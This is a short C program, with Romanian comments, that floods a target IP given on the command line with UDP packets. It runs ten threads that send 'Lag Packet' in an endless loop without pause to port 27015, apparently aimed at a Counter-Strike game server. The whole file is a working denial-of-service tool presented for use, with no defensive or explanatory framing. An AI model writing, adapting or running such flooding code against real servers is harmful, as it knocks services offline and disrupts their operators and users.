#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <unistd.h>
#include <pthread.h>

#define THREADS 10 // Numărul de fire de execuție

void* flood(void* arg) {
    int sockfd;
    struct sockaddr_in server_addr;
    char message[] = "Lag Packet";
    char* server_ip = (char*) arg;
    
    sockfd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    
    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(27015); // Portul serverului tău CS
    server_addr.sin_addr.s_addr = inet_addr(server_ip);

    while(1) {
        sendto(sockfd, message, strlen(message), 0, (struct sockaddr *)&server_addr, sizeof(server_addr));
        // Fără sleep pentru a trimite pachete cât mai rapid posibil
    }

    close(sockfd);
    return NULL;
}

int main(int argc, char *argv[]) {
    if (argc != 2) {
        printf("Utilizare: %s <IP_Server>\n", argv[0]);
        return -1;
    }

    pthread_t thread[THREADS];
    for(int i = 0; i < THREADS; i++) {
        pthread_create(&thread[i], NULL, flood, argv[1]);
    }

    for(int i = 0; i < THREADS; i++) {
        pthread_join(thread[i], NULL);
    }

    return 0;
}
